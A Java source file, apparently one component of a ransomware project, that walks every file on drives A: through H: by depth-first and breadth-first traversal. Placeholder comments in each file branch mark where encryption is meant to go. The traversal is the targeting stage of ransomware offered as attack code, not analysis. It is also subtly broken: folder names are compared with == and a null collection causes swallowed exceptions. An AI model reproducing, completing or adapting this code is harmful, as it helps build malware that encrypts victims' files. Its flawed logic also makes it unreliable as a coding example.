package Agent.Attack;

import java.io.File;
import java.util.Collection;
import java.util.LinkedList;
import java.util.Queue;

import Agent.SpreadR.SpreadRansom;

public class AttackVector implements SpreadRansom {

	// Check if specific directory is already found in the folder tree
	public boolean isVisitedFolder(File file, Collection<File> folderTree) {
		if (folderTree == null)
			return false;
		else {
			for (File directory : folderTree) {

				if (directory.getName() == file.getName()) {
					return true;
				}
			}
			return false;
		}

	}

	// Recursive function to traverse the given directory in Java using DFS
	public void EncryptFilesDFS(String directoryName, Collection<File> dirs) {
		File directory = new File(directoryName);

		// Get all files from a directory.
		File[] fList = directory.listFiles();
		if (fList != null) {
			for (File file : fList) {
				if (file.isDirectory()) {

					if (!(isVisitedFolder(file, dirs))) {

						try {
							dirs.add(file);
						} catch (NullPointerException e) {

						}
						EncryptFilesDFS(file.getAbsolutePath(), dirs);
					}
				} else if (file.isFile()) {
					// The encryption will be here
					//System.out.println(file.getPath());
				}
			}
		}
	}

	// BFS traversal from a given source inputDir
	public void EncryptFilesBFS(String inputDir, Collection<File> dirs) {
		/* make a queue to store files and directories */
		Queue<File> queue = new LinkedList<>();

		queue.add(new File(inputDir));

		/* loop until queue is empty - */
		while (!queue.isEmpty()) {

			/* get next file/directory from the queue */
			File current = queue.poll();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {
						try {

							if (!(isVisitedFolder(file, dirs))) {

								dirs.add(file);

							}
						} catch (NullPointerException e) {
						}
						queue.add(file);

					} else if (file.isFile()) {
						// encryption will be here
						//System.out.println(file.getPath());
					}

				}
			}
		}
	}

	@Override
	public void spread() {

		Collection<File> folderTree = null;

		for (char i = 'A'; i <= 'H'; i++) {
			EncryptFilesDFS(i + ":\\", folderTree);
			EncryptFilesBFS(i + ":\\", folderTree);
		}

	}

}
